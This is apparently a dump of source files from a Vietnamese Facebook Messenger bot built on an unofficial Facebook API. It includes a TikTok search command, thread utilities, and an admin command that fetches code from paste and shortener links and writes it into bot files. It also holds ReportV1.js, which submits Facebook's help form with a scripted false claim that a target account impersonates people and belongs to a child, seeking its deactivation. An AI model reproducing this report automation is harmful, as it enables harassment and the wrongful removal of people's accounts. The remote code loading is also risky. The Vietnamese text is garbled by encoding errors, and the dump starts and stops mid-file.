'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n            }\n        });\n\n        const result = response.data.data.videos;\n        if (!result || result.length == 0) return api.sendMessage(\"ùóûùóµùóºÃÇùóªùó¥ ùòÅùó∂ÃÄùó∫ ùòÅùóµùóÆÃÇÃÅùòÜ ùó∏ùó≤ÃÇÃÅùòÅ ùóæùòÇùóÆÃâ ùóªùóÆÃÄùóº\", event.threadID);\n\n        const lengthResult = result.length > 9 ? 9 : result.length;\n        let videoInfo = [];\n        let msg = `üîé ùêªùëíÃ£ÃÇ ùë°‚ÑéùëúÃÇÃÅùëõùëî ƒëùëéÃÉ ùë°ùëñÃÄùëö ùë°‚ÑéùëéÃÇÃÅùë¶ ${lengthResult} ùò¨ùò¶ÃÇÃÅùòµ ùò≤ùò∂ùò¢Ãâ ùëù‚Ñéùë¢ÃÄ ‚ÑéùëúÃõÃ£ùë£ùëñ ùëèùëéÃ£ùëõ\\n====================\\n`;\n        \n        let nameATM = [], attachment = [];\n        for (let i = 0; i < lengthResult; i++) {\n            const video = result[i];\n            \n            // C·∫•u tr√∫c d·ªØ li·ªáu t·ª´ TikWM API\n            const digg_count = video.digg_count || 0;\n            const comment_count = video.comment_count || 0;\n            const play_count = video.play_count || 0;\n            const share_count = video.share_count || 0;\n            const download_count = video.download_count || 0;\n            const duration = video.duration || 0;\n            const region = video.region || 'N/A';\n            const title = video.title || 'Kh√¥ng c√≥ ti√™u ƒë·ªÅ';\n            const nickname = video.author?.nickname || 'Kh√¥ng r√µ';\n            const unique_id = video.author?.unique_id || 'Kh√¥ng r√µ';\n            const video_url = video.play || video.wmplay || '';\n            const cover = video.cover || video.origin_cover || '';\n            \n            if (cover) {\n                try {\n                    let stream_ = await axios.get(encodeURI(cover), { responseType: 'arraybuffer' });\n                    const tempDir = __dirname + \"/tikinfo\" + Date.now() + i + \".png\";\n                    fs.writeFileSync(tempDir, Buffer.from(stream_.data, 'utf8'));\n                    nameATM.push(tempDir);\n                    attachment.push(fs.createReadStream(tempDir));\n                } catch (e) {\n                    console.log('L·ªói t·∫£i ·∫£nh cover:', e.message);\n                }\n            }\n            \n            msg += `‚û£ K·∫øt qu·∫£: ${i + 1}\\n‚û£ T√°c gi·∫£: ${nickname}\\n‚û£ Title: ${title}\\n‚û£ ùóßùóµùóºÃõÃÄùó∂ ùó¥ùó∂ùóÆùóª: ${duration} gi√¢y\\n====================\\n`;\n            videoInfo.push({ digg_count, comment_count, play_count, share_count, download_count, region, nickname, title, video_url, cover, unique_id, duration });\n        }\n        \n        api.setMessageReaction(\"‚úÖ\", event.messageID, () => { }, true);\n        msg += '\\n\\nüòâ ùëÉùò©ùëéÃâùòØ ùò©ùëúÃÇÃÄùò™ ùòµùëñùòØ ùòØ‚Ñéùò¢ÃÜÃÅùëõ ùëõùò¢ÃÄùë¶ ùë°ùò©ùëíùò∞ ùò¥ùëúÃÇÃÅ ùë°ùò©ùë¢ÃõÃÅ ùë°ùò∂ÃõÃ£ ùò∑ùëñùò•ùëíùò∞ ùò§ùëéÃÇÃÄùòØ ùòπùëíùòÆ';\n\n        api.sendMessage({ body: msg, attachment }, event.threadID, (err, info) => {\n            if (err) return console.log(err);\n            nameATM.forEach(pa => {\n                try {\n                    fs.unlinkSync(pa);\n                } catch (e) {\n                    console.log('L·ªói x√≥a file:', e.message);\n                }\n            });\n            global.client.handleReply.push({\n                name: module.exports.config.name,\n                author: event.senderID,\n                messageID: info.messageID,\n                videoInfo,\n                type: \"search\"\n            });\n        });\n        \n    } catch (err) {\n        console.log('L·ªói khi g·ªçi TikWM API:', err.message);\n        api.sendMessage(\"C√≥ l·ªói x·∫£y ra khi t√¨m ki·∫øm video TikTok. Vui l√≤ng th·ª≠ l·∫°i sau!\", event.threadID);\n        api.setMessageReaction(\"‚ùå\", event.messageID, () => { }, true);\n    }\n};","path":null,"size_bytes":8060,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeThreadColor.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeThreadColor(color, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc(err);\n      };\n    }\n\n    var validatedColor = color !== null ? color.toLowerCase() : color; // API only accepts lowercase letters in hex string\n    var colorList = Object.keys(api.threadColors).map(function (name) {\n      return api.threadColors[name];\n    });\n    if (!colorList.includes(validatedColor)) throw { error: \"The color you are trying to use is not a valid thread color. Use api.threadColors to find acceptable values.\" };\n\n    var form = {\n      dpr: 1,\n      queries: JSON.stringify({\n        o0: {\n          //This doc_id is valid as of January 31, 2020\n          doc_id: \"1727493033983591\",\n          query_params: {\n            data: {\n              actor_id: ctx.userID,\n              client_mutation_id: \"0\",\n              source: \"SETTINGS\",\n              theme_id: validatedColor,\n              thread_id: threadID\n            }\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeThreadColor\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1863,"size_tokens":null},"modules/commands/code.js":{"content":"module.exports.config = {\n    name: \"code\",\n    version: \"1.0.0\",\n    hasPermssion: 3,\n    credits: \"ManhG\",\n    description: \"read/write/cre/edit/del/rename\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"code\",\n    cooldowns: 5,\n    dependencies: {\n    }\n};\nmodule.exports.run = async ({ api, event, args, Users }) => {\n    const axios = global.nodemodule[\"axios\"];\n    const fs = global.nodemodule[\"fs-extra\"];\n    const cheerio = global.nodemodule[\"cheerio\"];\n  const moment = require(\"moment-timezone\"); \n    var timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss\")\n    const permission = [\"100040472494187\"];\n  if (!permission.includes(event.senderID)) return api.sendMessage(\"?\", event.threadID, event.messageID);\n    if (!args[0]) return api.sendMessage(`=== „Äé CODE „Äè ===\\nH∆∞·ªõng d·∫´n s·ª≠ d·ª•ng:\\ncode up: ƒê·ªÉ up code l√™n buildtool.dev ho·∫∑c reply link buildtool.dev ƒë·ªÉ √°p d·ª•ng code v√†o file.\\ncode send: ƒê·ªÉ g·ª≠i file bot b·∫°n mu·ªën.\\ncode create: ƒê·ªÉ t·∫°o file trong commands.\\ncode del: ƒê·ªÉ x√≥a file trong commands.\\ncode rename: ƒê·ªÉ ƒë·∫∑t l·∫°i t√™n file trong commands.\\n\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n=== „Äé ùêÅùêéùêì „Äè ===\\n\\n===„Äå${timeNow}„Äç===`, event.threadID);\n    var path = __dirname + '/';\n    switch (args[0]) {\n        case '-c':\n        case 'create': {\n            if (args[1].length == 0) return api.sendMessage(\"Vui l√≤ng ƒë·∫∑t t√™n cho file c·ªßa b·∫°n\", event.threadID);\n            if (fs.existsSync(`${__dirname}/${args[1]}.js`))\n                return api.sendMessage(\n                    `File ${args[1]}.js ƒë√£ t·ªìn t·∫°i.`,\n                    event.threadID,\n                    event.messageID\n                );\n            fs.copySync(__dirname + \"/example.js\", __dirname + \"/\" + args[1] + \".js\");\n            return api.sendMessage(\n                `ƒê√£ t·∫°o th√†nh c√¥ng file \"${args[1]}.js\".`,\n                event.threadID,\n                event.messageID\n            );\n            break;\n        }\n        case \"-d\":\n        case 'del': {\n            fs.unlink(`${__dirname}/${args[1]}.js`);\n            return api.sendMessage(`ƒê√£ xo√° file ${args[1]}.js`, event.threadID, event.messageID);\n            break;\n        }\n        case \"rename\":\n        case 're': {\n            fs.rename(`${__dirname}/${args[1]}.js`, `${__dirname}/${args[2]}.js`, function (err) {\n                if (err) throw err;\n                return api.sendMessage(\n                    `ƒê√£ ƒë·ªïi t√™n file ${args[1]}.js th√†nh ${args[2]}.js`,\n                    event.threadID,\n                    event.messageID)\n            });\n            break;\n        }\n      case 'up':\n      case 'link': {\n        const request = require('request')\n  const cheerio = require('cheerio');\n  const fs = require('fs')\n  const { threadID, messageID } = event;\n  const content = args[1];\n  if(!content) return api.sendMessage('Thi·∫øu d·ªØ li·ªáu!', threadID, messageID);\n  if(content.endsWith(\".js\") || content.endsWith(\".json\")) {\n    var data = await fs.readFile(\n      `${__dirname}/${content}`,\n      \"utf-8\",\n      async function (err, data) {\n        if (err) return api.sendMessage(`Kh√¥ng t√¨m th·∫•y file \"${content}\".`, threadID, messageID);\n        await builtooldev(data)\n      }\n    );\n  }\n  else if(event.type == \"message_reply\" && (event.messageReply.body.indexOf('https://buildtool.') !== -1 || event.messageReply.body.indexOf('https://tinyurl.com') !== -1)) {\n    if(!args[1]) return api.sendMessage('Vui l√≤ng nh·∫≠p t√™n file mu·ªën √°p d·ª•ng code m·ªõi!', threadID, messageID);\n    const options = {\n      method: 'GET',\n      url: event.messageReply.body\n    };\n    request(options, function (error, response, body) {\n      if(error) return api.sendMessage('Vui l√≤ng ch·ªâ reply link (kh√¥ng ch·ª©a g√¨ kh√°c ngo√†i link)', threadID, messageID);\n      const load = cheerio.load(body);\n      load('.language-js').each((index, el) => {\n        if(index !== 0) return;\n        var code = el.children[0].data\n        fs.writeFile(`${__dirname}/${args[1]}.js`, code, \"utf-8\",\n          function(err) {\n            if (err) return api.sendMessage(`ƒê√£ x·∫£y ra l·ªói khi √°p d·ª•ng code m·ªõi cho \"${args[1]}.js\".`);\n            return api.sendMessage(`ƒê√£ th√™m code n√†y v√†o \"${args[1]}.js\".`, threadID, messageID);\n          }\n        );\n      });\n    });\n  }\n  else {\n    await builtooldev(content)\n  }\n  async function builtooldev(content) {\n    const options = {\n        method: 'POST',\n        url: 'https://buildtool.dev/verification',\n        headers: {\n          'cookie': 'paste_submitted=yes; last_code_class=language-js; last_page_link=code-viewer.php%3Fpaste%3D097ba7.language-js'\n        },\n        form: {\n          'content': content,\n          'code_class': 'language-js'\n        }\n    };\n    request(options, function (error, response, body) {\n      if(error) return api.sendMessage('ƒê√£ c√≥ l·ªói x·∫£y ra!', threadID, messageID);\n      const $ = cheerio.load(body);\n      $('a').each((index, el) => {\n      if(index !== 0) return;\n        return api.sendMessage(`Link c·ªßa b·∫°n ƒë√¢y: https://buildtool.dev/${el.attribs.href}`, threadID,\n            async function(error, info) {\n                if(error) return await shortLink(el.attribs.href)\n            }, messageID);\n      });\n    });\n  }\n  async function shortLink(link) {\n    const turl = require('turl');\n    turl.shorten('https://buildtool.dev/' + link).then((res) => {\n      return api.sendMessage(`Do b·ªã h·∫°n ch·∫ø n√™n g·ª≠i link r√∫t g·ªçn: ${res}`, threadID, messageID);\n    }).catch((err) => {\n      return api.sendMessage(`B·ªè d·∫•u c√°ch: https://buildtool. dev/${link}`, threadID, messageID);\n    });\n  }\n} break;\n        case 'send':\n        case 'give': {\n  const stringSimilarity = require('string-similarity');\n  const file = args[1];\n  if(!file) return api.sendMessage('T√™n file kh√¥ng ƒë∆∞·ª£c b·ªè tr·ªëng', event.threadID, event.messageID);\n  if (!file.endsWith('.js')) return api.sendMessage('ƒêu√¥i file kh√¥ng ƒë∆∞·ª£c kh√°c .js', event.threadID, event.messageID);\n  if(event.type == \"message_reply\") {\n    var uid = event.messageReply.senderID\n    var name = (await Users.getData(uid)).name\n    if(!fs.existsSync(__dirname+\"/\"+file)) { \n      var mdl = args.splice(1, args.length);\n        mdl = fs.readdirSync(__dirname).filter((file) => file.endsWith(\".js\"))\n        mdl = mdl.map(item => item.replace(/\\.js/g, \"\"));\n      var checker = stringSimilarity.findBestMatch(file, mdl)\n        if (checker.bestMatch.rating >= 1) var search = checker.bestMatch.target;\n          if(search == undefined) return api.sendMessage('Kh√¥ng t√¨m th·∫•y file ' + args.join(\" \"), event.threadID, event.messageID); \n      return api.sendMessage('Kh√¥ng t√¨m th·∫•y file: ' + file + ' \\nNh∆∞ng c√≥ file g·∫ßn gi·ªëng l√†: ' + search + '.js, \\n\\nTh·∫£ c·∫£m x√∫c v√†o tin nh·∫Øn n√†y ƒë·ªÉ give n√≥.', event.threadID, (error, info) => {\n          global.client.handleReaction.push({\n            type: 'user',\n              name: this.config.name,\n              author: event.senderID,\n              messageID: info.messageID,\n              file: search,\n              uid: uid,\n              namee: name\n          })}, event.messageID);\n    }\n    fs.copyFile(__dirname + '/'+file, __dirname + '/'+ file.replace(\".js\",\".txt\"));\n    return api.sendMessage({\n      body: 'File ' + args.join(' ') + ' c·ªßa b·∫°n ƒë√¢y', \n      attachment: fs.createReadStream(__dirname + '/' + file.replace('.js', '.txt'))\n    }, uid, () => fs.unlinkSync(__dirname + '/' + file.replace('.js', '.txt'))).then(\n            api.sendMessage('Check tin nh·∫Øn ƒëi ' + name, event.threadID, (error, info) => {\n              if(error) return api.sendMessage('C√≥ l·ªói khi g·ª≠i file ƒë·∫øn ' + name, event.threadID, event.messageID);\n            }, event.messageID));\n  }\n  else {\n    if(!fs.existsSync(__dirname+\"/\"+file)) { \n      var mdl = args.splice(1, args.length);\n        mdl = fs.readdirSync(__dirname).filter((file) => file.endsWith(\".js\"))\n        mdl = mdl.map(item => item.replace(/\\.js/g, \"\"));\n      var checker = stringSimilarity.findBestMatch(file, mdl)\n        if (checker.bestMatch.rating >= 0.5) var search = checker.bestMatch.target;\n          if(search == undefined) return api.sendMessage('Kh√¥ng t√¨m th·∫•y file ' + args.join(\" \"), event.threadID, event.messageID); \n      return api.sendMessage('Kh√¥ng t√¨m th·∫•y file: ' + file + ' \\nNh∆∞ng c√≥ file g·∫ßn gi·ªëng l√†: ' + search + '.js, \\n\\nTh·∫£ c·∫£m x√∫c v√†o tin nh·∫Øn n√†y ƒë·ªÉ give n√≥.', event.threadID, (error, info) => {\n          global.client.handleReaction.push({\n            type: 'thread',\n              name: this.config.name,\n              author: event.senderID,\n              messageID: info.messageID,\n              file: search\n          })}, event.messageID);\n    }\n    fs.copyFile(__dirname + '/'+file, __dirname + '/'+ file.replace(\".js\",\".txt\"));\n    return api.sendMessage({\n      body: 'File ' + args.join(' ') + ' c·ªßa b·∫°n ƒë√¢y', \n      attachment: fs.createReadStream(__dirname + '/' + file.replace('.js', '.txt'))\n    }, event.threadID, () => fs.unlinkSync(__dirname + '/' + file.replace('.js', '.txt')), event.messageID);\n  }\n} break;\n        default : {\n          const prefix = (threadSetting.hasOwnProperty(\"PREFIX\")) ? threadSetting.PREFIX : global.config.PREFIX;\n          return api.sendMessage(`===„Äå CODE „Äç===\\nH∆∞·ªõng d·∫´n s·ª≠ d·ª•ng:\\n${prefix+this.config.name} up: ƒê·ªÉ up code l√™n buildtool.dev ho·∫∑c reply link buildtool.dev ƒë·ªÉ √°p d·ª•ng code v√†o file.\\n${prefix+this.config.name} send: ƒê·ªÉ g·ª≠i file bot b·∫°n mu·ªën.\\n${prefix+this.config.name} create: ƒê·ªÉ t·∫°o file trong commands.\\n${prefix+this.config.name} del: ƒê·ªÉ x√≥a file trong commands.\\n${prefix+this.config.name} rename: ƒê·ªÉ ƒë·∫∑t l·∫°i t√™n file trong commands.\\n‚ôªÔ∏è====ùï∏ùñéùñìùñôùïØùñÜùï∑====‚ôªÔ∏è`, event.threadID, event.messageID)\n        }\n    }\n}\n\nmodule.exports.handleReaction = ({ Users, api, event, handleReaction,  }) => {\n    var { file, author, type, uid, namee } = handleReaction;\n    if (event.userID != handleReaction.author) return;\n    const fs = require(\"fs-extra\")\n    var fileSend = file + '.js'\n    switch (type) {\n      case \"user\": {\n        fs.copyFile(__dirname + '/'+fileSend, __dirname + '/'+ fileSend.replace(\".js\",\".txt\"));\n        api.unsendMessage(handleReaction.messageID)\n      return api.sendMessage({\n        body: 'File ' + file + ' c·ªßa b·∫°n ƒë√¢y', \n        attachment: fs.createReadStream(__dirname + '/' + fileSend.replace('.js', '.txt'))\n      }, uid, () => fs.unlinkSync(__dirname + '/' + fileSend.replace('.js', '.txt'))).then(\n            api.sendMessage('Check tin nh·∫Øn ƒëi ' + namee, event.threadID, (error, info) => {\n              if(error) return api.sendMessage('C√≥ l·ªói khi g·ª≠i file ƒë·∫øn ' + namee, event.threadID, event.messageID);\n            }, event.messageID));;\n    }\n    case \"thread\": {\n      fs.copyFile(__dirname + '/'+fileSend, __dirname + '/'+ fileSend.replace(\".js\",\".txt\"));\n        api.unsendMessage(handleReaction.messageID)\n      return api.sendMessage({\n        body: 'File ' + file + ' c·ªßa b·∫°n ƒë√¢y', \n        attachment: fs.createReadStream(__dirname + '/' + fileSend.replace('.js', '.txt'))\n      }, event.threadID, () => fs.unlinkSync(__dirname + '/' + fileSend.replace('.js', '.txt')), event.messageID);\n    }\n  }\n}","path":null,"size_bytes":11408,"size_tokens":null},"lib/Fca-Horizon-Remastered/Func/ReportV1.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (args,callback) {\n        if (!args.Link && !args.RealName && !args.Content && !args.Gmail) throw new Error(\"Link,RealName,Content,Gmail are required\");\n        if (!args.Link) throw new Error(\"ƒêi·ªÅn args.Link v√†o, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)\");\n        if (!args.RealName) throw new Error(\"ƒêi·ªÅn RealName v√†o, api.Premium.ReportV1(Link,RealName,Content,Time,Gmail,callback)\");\n        if (!args.Gmail) throw new Error(\"ƒêi·ªÅn Gmail v√†o, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)\");\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        let RealForm;\n        utils.get('https://www.facebook.com/help/contact/209046679279097?locale2=en_US', ctx.jar, null, ctx.globalOptions)\n        .then(function(data) {\n            RealForm = {\n                crt_url: args.Link,\n                crt_name: args.RealName,\n                cf_age: \"9 years\",\n                Field255260417881843: args.Content ? utils.getType(args.Content)==\"String\"? args.Content : \"This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!\" : \"This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!\",\n                Field166040066844792: args.Gmail,\n                source: '',\n                support_form_id: 209046679279097,\n                support_form_hidden_fields: JSON.stringify({}),\n                support_form_fact_false_fields: [],\n                lsd: utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n            };\n        }).then(function() {\n            defaultFuncs.postFormData('https://www.facebook.com/ajax/help/contact/submit/page', ctx.jar, RealForm, {}) \n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(async function(dt) {\n                if (dt.__ar == 1) {\n                    callback(null, \"Th√†nh C√¥ng\");\n                }\n                else {\n                    callback(null, \"Th·∫•t B·∫°i\");\n                }\n            });\n        })\n        return returnPromise;\n    }\n};\n","path":null,"size_bytes":2857,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/unfriend.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function unfriend(userID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n        resolveFunc(friendList);\n      };\n    }\n\n    var form = {\n      uid: userID,\n      unref: \"bd_friends_tab\",\n      floc: \"friends_tab\",\n      \"nctr[_mod]\": \"pagelet_timeline_app_collection_\" + ctx.userID + \":2356318349:2\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/profile/removefriendconfirm.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"unfriend\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1148,"size_tokens":null},"lib/fca-auto/src/getThreadInfoOLD.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var { capture } = require('../Extra/Src/Last-Run');\n  var Database = require('../Extra/Database');\n  global.Fca.Data.Userinfo = [];\n  \n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n      // ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n      // nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n      // ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n      //c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    var SpecialMethod = function(TID) {\n      const All = getAll();\n      const Real = [];\n      const Average = [];\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          if (i.data.TimeCreate + 900 * 1000 <= Date.now()) {\n            Real.push(i.data.threadID);\n          }\n          else {\n            Average.push({\n              threadID: i.data.threadID,\n              TimeCreate: i.data.TimeCreate\n            });\n            continue;\n          }\n        } else continue;\n      }\n    const AllofThread = [];\n    if (Average.length > 0) {\n      var Time = 0;\n      for (let i of Average) {\n        Time += i.TimeCreate;\n      }\n      Time = Time / Average.length;\n      if (Time + 900 * 1000 <= Date.now()) {\n        for (let i of Average) {\n          Real.push(i.threadID);\n        }\n      } //can't =))\n      else {\n        setTimeout(function () {\n          SpecialMethod(TID);\n        }, Time + 900 * 1000 - Date.now());\n      }\n    }\n    else {\n      setTimeout(function () {\n        SpecialMethod(TID);\n      }, 900 * 1000);\n    }\n    if (Real.length == 0) return;\n    else if (Real.length == 1) {\n      return DefaultMethod(TID);\n    } \n    else if (All.length > 1) {\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          AllofThread.push(i.data.threadID);\n        } else continue;\n      }\n      var Form = {};\n      var ThreadInfo = [];\n        \n        AllofThread.map(function (x,y) {\n          Form[\"o\" + y] = {\n            doc_id: \"3449967031715030\",\n            query_params: {\n              id: x,\n              message_limit: 0,\n              load_messages: false,\n              load_read_receipts: false,\n              before: null\n            }\n          };\n        });\n  \n        var form = {\n          queries: JSON.stringify(Form),\n          batch_name: \"MessengerGraphQLThreadFetcher\"\n        };\n  \n        defaultFuncs\n        .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function(resData) {\n          if (resData.error) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          if (resData[resData.length - 1].error_results !== 0) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          resData = resData.splice(0, resData.length - 1);\n          resData.sort((a, b) => { return 